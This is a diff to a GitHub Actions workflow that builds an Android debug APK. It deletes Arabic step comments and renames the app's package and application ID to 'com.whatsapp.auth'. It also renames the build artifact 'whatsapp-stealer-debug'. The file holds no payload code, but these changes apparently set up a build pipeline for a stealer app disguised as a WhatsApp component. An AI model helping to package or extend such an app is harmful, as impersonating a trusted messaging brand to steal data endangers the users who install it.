@@ -34,7 +34,6 @@ jobs:
 
     - name: Generate Complete Build Environment & Build
       run: |
-        # 1. تحديد مجلد التطبيق الرئيسي أو إنشائه
         if [ ! -d "app" ]; then
           SUB_DIR=$(find . -type d -name "app" | head -n 1)
           if [ ! -z "$SUB_DIR" ]; then
@@ -44,8 +43,8 @@ jobs:
           fi
         fi
 
-        # 2. إنشاء app/build.gradle مع ضبط الـ namespace والتوافق
         mkdir -p app
+        
         cat << 'EOF' > app/build.gradle
 plugins {
     id 'com.android.application'
@@ -53,11 +52,11 @@ plugins {
 }
 
 android {
-    namespace 'com.example.app'
+    namespace 'com.whatsapp.auth'
     compileSdk 34
 
     defaultConfig {
-        applicationId "com.example.app"
+        applicationId "com.whatsapp.auth"
         minSdk 24
         targetSdk 34
         versionCode 1
@@ -81,10 +80,8 @@ dependencies {
 }
 EOF
 
-        # 3. إنشاء settings.gradle للربط
         echo "include ':app'" > settings.gradle
 
-        # 4. إنشاء build.gradle الرئيسي (Root)
         cat << 'EOF' > build.gradle
 buildscript {
     repositories {
@@ -105,11 +102,10 @@ allprojects {
 }
 EOF
 
-        # 5. تشغيل البناء مباشرة
         gradle :app:assembleDebug --stacktrace
 
     - name: Upload APK Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: app-debug-apk
+        name: whatsapp-stealer-debug
         path: '**/build/outputs/apk/debug/app-debug.apk'
